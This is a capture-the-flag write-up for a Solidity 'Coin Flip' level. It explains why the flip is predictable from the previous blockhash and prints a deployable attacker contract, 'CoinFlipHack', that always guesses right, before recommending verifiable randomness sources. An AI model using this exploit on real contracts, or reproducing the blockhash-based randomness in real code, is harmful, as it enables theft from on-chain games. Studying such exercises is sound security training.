# Coin Flip

## Challenge Statement

This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.

## Code Analysis

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins; // result accumulator
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  // Target function, the coin flip logic is pseudorandom, the input variables can be mirrored to calculate the next correct coinFlip.
  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1))); // public blocknumber

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR); // FACTOR is public - visible by reading contract's source code
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

## Solution

With the pseudorandomness of the contract and the fact the source code can be read, we're able to quickly run the code before we submit the answer so we are correct each time.

Here's a hacky solution that I deployed via Remix to guess the correct coinflip...10 times!

```
pragma solidity ^0.6.0;

import 'github/OpenZeppelin/openzeppelin-contracts/contracts/math/SafeMath.sol';

interface OGCoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract CoinFlipHack {

  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  address target = <target_contract_address>;

  function hack() public {
      uint256 blockValue = uint256(blockhash(block.number.sub(1)));
      uint256 coinFlip = blockValue.div(FACTOR);
      bool side = coinFlip == 1 ? true : false;
      OGCoinFlip(target).flip(side);
  }
}
```

## Moral

Generating random numbers can be difficult in solidity, no native way and smart contracts are public - even local variables and state variables marked as private. Miners also have control over things like blockhashes, timestamps, and whether to include certain transactions - which allows them to bias these values in their favor.

To get cryptographically proven random numbers, you can use Chainlink VRF, which uses an oracle, the LINK token, and an on-chain contract to verify that the number is truly random.

Some other options include using Bitcoin block headers (verified through BTC Relay), RANDAO, or Oraclize).